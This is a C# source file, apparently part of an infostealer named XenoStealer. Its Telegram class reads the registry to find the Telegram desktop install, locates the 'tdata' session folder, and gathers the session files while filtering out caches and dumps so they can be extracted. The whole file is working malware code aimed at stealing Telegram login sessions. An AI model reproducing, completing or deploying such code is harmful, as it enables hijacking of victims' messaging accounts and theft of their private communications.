using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Telegram
    {
        public static DataExtractionStructs.TelegramInfo? GetInfo() 
        {
            object _telegramLocation=Utils.ReadRegistryKeyValue(Microsoft.Win32.RegistryHive.ClassesRoot, "tg\\DefaultIcon", "");
            if (_telegramLocation == null || _telegramLocation.GetType() != typeof(string)) 
            {
                return null;
            }
            string rootPath = ((string)_telegramLocation).Replace("\"","");

            if (!rootPath.Contains(",") || rootPath.IndexOf(",")==0) 
            {
                return null;
            }

            rootPath = rootPath.Split(',')[0];

            rootPath = Path.GetDirectoryName(rootPath);

            rootPath = Path.Combine(rootPath, "tdata");

            string[] exclude = new string[] { "_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview" };
            string[] excludePatterns = new string[] { "_.*\\.config", "dumps", "tdummy", "emoji", "user_data", "user_data#\\d+", ".*\\.json", "webview" };
            string[] files;
            try
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(rootPath);
                files = directoryInfo.GetFiles("*", SearchOption.AllDirectories).Where(f => !IsExcluded(f.FullName, excludePatterns)).Select(fileInfo => fileInfo.FullName).ToArray();
            }
            catch 
            {
                return null;
            }

            return new DataExtractionStructs.TelegramInfo(rootPath, files);

        }

        private static bool IsExcluded(string filePath, string[] patterns)
        {
            foreach (string pattern in patterns)
            {
                if (Regex.IsMatch(filePath, pattern))
                {
                    return true;
                }
            }
            return false;
        }

    }
}
